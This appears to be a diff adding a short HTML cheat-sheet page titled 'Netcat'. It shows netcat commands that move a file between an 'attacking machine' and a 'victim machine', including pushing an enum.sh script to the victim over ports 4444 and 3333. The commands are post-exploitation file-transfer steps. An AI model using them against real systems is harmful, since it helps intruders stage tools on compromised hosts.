@@ -1,0 +1,19 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Netcat</title>
+</head><body>Send a file on your machine to victim machine by listening for victim to connect outbound to you<b><br/>
+</b><b>On attacking machine:</b><br/>
+nc -lvp 4444 &lt; file<br/>
+<br/>
+<b>On victim machine:</b><br/>
+nc 192.168.1.102 4444 &gt; file<br/>
+<br/>
+Send a file on your machine to victim machine by having victim listen for you to connect into <br/>
+<b>On attacking machine:</b><br/>
+nc 192.168.1.103 3333 &lt; enum.sh<br/>
+<br/>
+<b>On victim machine:</b><br/>
+nc -lvp 3333 &gt; enum.sh<br/>
+</body></html>
